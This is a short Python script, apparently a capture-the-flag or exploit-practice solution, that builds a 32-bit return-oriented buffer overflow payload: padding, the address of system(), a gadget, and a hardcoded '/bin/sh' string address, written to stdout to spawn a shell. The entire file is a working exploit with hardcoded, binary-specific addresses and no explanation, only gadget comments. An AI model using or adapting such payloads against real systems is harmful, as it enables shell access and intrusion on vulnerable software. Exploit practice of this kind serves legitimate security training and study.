import sys
import struct
import pwn

x = lambda a: struct.pack('<I', a)
# 0x8048890:  xor byte ptr [ebx], cl; ret;
system = 0x80484e0
bin_sh = 0xf7f1baaa
pop_edi_ret = 0x804889a
payload = ('D'*40).encode()
payload += ('B'*4).encode()

# payload += x(0x804844a)
payload += x(system)
payload += x(0x80488f9)  # pop esi; pop edi; pop ebp; ret;
payload += x(bin_sh)
# payload += x(bin_sh)
# payload += x(0x804a044)
payload += '\n'.encode()
sys.stdout.buffer.write(payload)
